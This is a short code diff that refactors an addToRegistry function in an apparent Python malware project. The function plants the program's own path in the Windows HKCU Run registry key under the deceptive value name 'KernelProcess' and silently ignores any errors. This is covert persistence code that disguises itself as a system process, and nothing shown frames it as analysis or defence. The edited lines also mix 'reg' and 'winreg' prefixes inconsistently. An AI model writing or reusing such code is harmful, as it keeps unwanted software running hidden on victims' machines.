@@ -149,19 +149,14 @@ def addToStartup():
 
 def addToRegistry():
     try:
-        address=os.path.abspath(sys.argv[0])
-         
-        key = HKEY_CURRENT_USER
+        address = os.path.abspath(sys.argv[0])
+        key = reg.HKEY_CURRENT_USER
         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-         
-        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
-         
-        reg.SetValueEx(open,"KernelProcess",0,reg.REG_SZ,address)
-         
-        reg.CloseKey(open)
+        
+        with reg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as reg_key:
+            reg.SetValueEx(reg_key, "KernelProcess", 0, winreg.REG_SZ, address)
         
         return True
-        
     except:
         return False
     
